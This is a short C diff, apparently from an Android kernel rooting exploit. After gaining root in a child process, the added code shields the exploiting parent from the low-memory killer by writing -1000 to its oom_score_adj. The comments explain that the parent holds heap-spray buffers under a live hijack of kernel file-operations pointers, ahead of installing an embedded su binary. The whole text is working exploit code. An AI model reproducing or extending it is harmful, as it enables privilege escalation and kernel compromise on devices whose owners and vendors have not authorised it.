@@ -105,6 +105,20 @@ int spawn_root_child(void) {
     }
     report.su_daemon_pid = -1;
     if (report.setgid_ret == 0 && report.setuid_ret == 0) {
+      /* lmkd armor: the host pins ~2 GiB in reclaim skb queues and is the
+       * top SIGKILL target. Host death frees the frags under a live global
+       * fops hijack — a guaranteed later panic. Shield the parent NOW. */
+      char oom_path[64];
+      snprintf(oom_path, sizeof(oom_path), "/proc/%d/oom_score_adj",
+               (int)captured_ppid);
+      int oom_fd = open(oom_path, O_WRONLY | O_CLOEXEC);
+      if (oom_fd >= 0) {
+        if (write(oom_fd, "-1000", 5) == 5) {
+          pr_info("root child lmkd armor parent pid=%d\n",
+                  (int)captured_ppid);
+        }
+        close(oom_fd);
+      }
       pr_info("root child step install_embedded_su entering\n");
       errno = 0;
       report.su_install_ret = install_embedded_su(&report.su_daemon_pid);
